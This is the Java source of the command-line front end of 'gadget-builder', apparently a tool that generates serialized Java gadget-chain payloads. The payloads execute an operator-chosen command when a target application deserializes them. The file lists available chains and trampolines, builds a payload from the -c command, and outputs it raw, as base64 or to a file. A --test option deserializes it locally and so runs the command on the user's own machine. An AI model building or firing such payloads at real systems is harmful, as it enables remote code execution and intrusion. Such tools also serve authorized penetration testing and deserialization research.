package org.ses.gadgetbuilder.client;

import org.apache.commons.cli.*;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.chains.trampolines.Trampoline;
import org.ses.gadgetbuilder.factory.GadgetBuilderFactory;
import org.ses.gadgetbuilder.util.Reflections;
import org.ses.gadgetbuilder.util.Serialization;

import java.io.Serializable;
import java.util.*;

public class Main {

    public static void main(String[] args) throws Exception {

        Options options = buildOptions();

        CommandLineParser commandLineParser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();

        CommandLine commandArgs = null;

        try {
            commandArgs = commandLineParser.parse(options, args);
        } catch (ParseException e) {
            e.printStackTrace();
            formatter.printHelp("gadget-builder", options);
            System.exit(1);
        }

        if (commandArgs.hasOption("h")) {

            if (commandArgs.hasOption("g")) {
                System.out.println("Looking for the general help message: use `gadget-builder` without the -g option");

                Class<? extends GadgetChain> gadgetChainClass = GadgetBuilderFactory.getChainByName(commandArgs.getOptionValue("g"));

                if (gadgetChainClass != null)
                    System.out.println(Reflections.createWithoutConstructor(gadgetChainClass).toString());

                else
                    System.out.println("No such gadget chain: " + commandArgs.getOptionValue("g"));


            } else {
                formatter.printHelp("gadget-builder", options);
            }

            System.exit(0);
        }
        if (commandArgs.hasOption("l")) {

            // TODO: list all available gadget chains, trampolines, and adapters
            System.out.println(GadgetBuilderFactory.getChainImplementations().size() + " Gadget Chains available.");
            System.out.println("To get usage information for a specific chain: java -jar gadgetbuilder.jar -g <chain> -h");
            System.out.println("-----------------");


            int chainCnt = 0;

            for (String impact : GadgetBuilderFactory.getImpacts()) {
                String chains = "";
                for (Class chain : GadgetBuilderFactory.getChainImplementations()) {
                    Impact impactAnnotation = (Impact) chain.getAnnotation(Impact.class);
                    if (impactAnnotation != null && impactAnnotation.value().equals(impact))
                        chains += chain.getSimpleName() + "\t";

                }
                System.out.printf("%-25s%s\n", impact, chains);
            }

            int totalVariationCount = 0;

            String undefinedImpactChains = "";
            for (Class chain : GadgetBuilderFactory.getChainImplementations()) {
               if (!chain.isAnnotationPresent(Impact.class)) {
                   undefinedImpactChains += chain.getSimpleName() + "\t";
               }

               totalVariationCount += ((GadgetChain) Reflections.createWithoutConstructor(chain)).getVariationCount();
            }
            System.out.printf("%-25s%s\n", "Undefined", undefinedImpactChains);
            System.out.println("Total possible variations: " + totalVariationCount);


            System.out.println("-----------------");

            List<Class<? extends Trampoline>> trampolineList = GadgetBuilderFactory.getTrampolineImplementations();
            Set<Class> superTypes = new HashSet<>();
            for (Class trampoline : trampolineList) {
                if (!trampoline.equals(NoTrampoline.class))
                    superTypes.add(trampoline.getInterfaces()[0]);
            }

            System.out.println(String.format("%s available trampolines.", GadgetBuilderFactory.getTrampolineImplementations().size()));
            System.out.println("-----------------");

            for (Class trampolineType : superTypes) {

                String trampolineString = "";

                for (Class trampoline : GadgetBuilderFactory.getTrampolineImplementations()) {
                    if (trampolineType.isAssignableFrom(trampoline))
                        trampolineString += trampoline.getSimpleName() + "\t";
                }
                System.out.printf("%-25s%s\n", trampolineType.getSimpleName(), trampolineString);

            }

            System.exit(0);
        }

        String command = commandArgs.getOptionValue('c', "");
        String chainName = commandArgs.getOptionValue('g');
        String trampolineName = commandArgs.getOptionValue('t', "");
        String adapterName = commandArgs.getOptionValue('a', "");

        if (chainName == null) {
            System.err.println("No gadget chain name provided with -g");
            System.exit(1);
        }
        if (command.isEmpty()) {
            System.err.println("Empty command (-c) arg. Are you sure?");
        }


        // Test if trampoline/adapter impl was provided with args and fallback to default
        if (adapterName.isEmpty()) adapterName = ConfigUtil.getDefaultAdapterFor(chainName);
        if (trampolineName.isEmpty()) trampolineName = ConfigUtil.getDefaultTrampolineFor(chainName);

        GadgetChain chain = GadgetBuilderFactory.buildChain(chainName, trampolineName, adapterName);
        Object payload = chain.build(command);

        if (commandArgs.hasOption('b')) {
            System.out.println(Serialization.serializeToBase64((Serializable) payload));
        }
        if (commandArgs.hasOption('o')) {
            Serialization.serializeToFile((Serializable) payload, commandArgs.getOptionValue('o'));
        }

        if (commandArgs.hasOption("--test")) {
            try {

                byte[] serializedBytes = Serialization.serialize((Serializable) payload);
                try {
                    Serialization.deserialize(serializedBytes);
                } catch (Exception e) {            }
            } catch (Exception e) {
                System.err.println("Something went wrong with serialization.");
                e.printStackTrace();
            }
        } else if (!commandArgs.hasOption('b') && !commandArgs.hasOption('o')) {
            System.out.println(new String(Serialization.serialize((Serializable) payload)));
        }
    }



    public static Options buildOptions() {
        Options options = new Options();

        Option commandOption = Option.builder("c")
                .longOpt("cmd")
                .argName("command")
                .hasArg()
                .desc("Command to execute with the gadget chain. Use: `gadget-builder -g <gadget chain> -h` to get chain specific help and usage examples.")
                .build();

        Option chainOption = Option.builder("g")
                .longOpt("gc")
                .argName("gadget chain")
                .hasArg()
                .desc("The gadget chain")
                .build();

        Option trampolineOption = Option.builder("t")
                .longOpt("trampoline")
                .argName("trampoline")
                .hasArg()
                .desc("Trampoline gadget to combine with the gadget chain. If no option: chosen random")
                .build();

        Option adapterOption = Option.builder("a")
                .longOpt("adapter")
                .argName("adapter")
                .hasArg()
                .desc("If a gadget chain leads to Method.invoke() or arbitrary <init> calls, this defines the call target.")
                .build();

        Option useDefaultsOption = Option.builder()
                .longOpt("useDefaults")
                .hasArg(false)
                .desc("If a gadget chain leads to Method.invoke() or arbitrary <init> calls, this defines the call target. If no option: chooses the default TemplatesImpl gadgets.")
                .build();

        Option listOption = Option.builder("l")
                .longOpt("list")
                .hasArg(false)
                .desc("List the available gadget chains, trampolines and adapters")
                .build();

        Option outputOption = Option.builder("o")
                .longOpt("output")
                .argName("file")
                .hasArg()
                .desc("Output the serialized gadget chain to <file>")
                .build();

        Option b64Option = Option.builder("b")
                .longOpt("b64")
                .hasArg(false)
                .desc("Output the serialized gadget chain in base64 format")
                .build();

        Option testOption = Option.builder()
                .longOpt("test")
                .hasArg(false)
                .desc("Self serialize-deserialize test in this app. !! Will be executed on your machine")
                .build();

        Option help = Option.builder("h")
                .longOpt("help")
                .hasArg(false)
                .desc("Print this message")
                .build();

        options.addOption(commandOption);
        options.addOption(chainOption);
        options.addOption(trampolineOption);
        options.addOption(adapterOption);
        options.addOption(listOption);
        options.addOption(outputOption);
        options.addOption(b64Option);
        options.addOption(help);
        options.addOption(testOption);


        return options;
    }


}
